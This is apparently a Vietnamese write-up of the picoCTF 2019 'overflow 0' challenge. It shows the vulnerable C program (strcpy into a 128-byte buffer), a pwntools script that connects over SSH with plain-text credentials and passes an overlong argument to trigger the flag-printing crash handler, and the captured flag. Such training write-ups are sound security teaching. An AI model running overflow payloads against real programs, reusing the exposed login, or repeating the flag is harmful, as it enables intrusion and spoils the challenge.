**Đây là đề bài trên pico 2019**

```sh
This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in /problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a on the shell server. Source.
```

**Source bài**
```sh
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}

```
Bài này cũng khá đơn giản, ta chỉ cần truyền tham số với độ dài lớn hơn độ dài của biến buffer 

Đây là file exploit của mình:
```sh
from pwn import *
s = ssh(host = '2019shell1.picoctf.com', user = 'hazir', password = '2k4')
r = s.run("cd /problems/overflow-0_0_6d0c88d7d40bc281760b515cb6a4660a; ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
r.interactive()
r.close()
```
Và chạy file bằng lệnh `python solve.py` thì BOOM....

`picoCTF{3asY_P3a5y0a131490}`
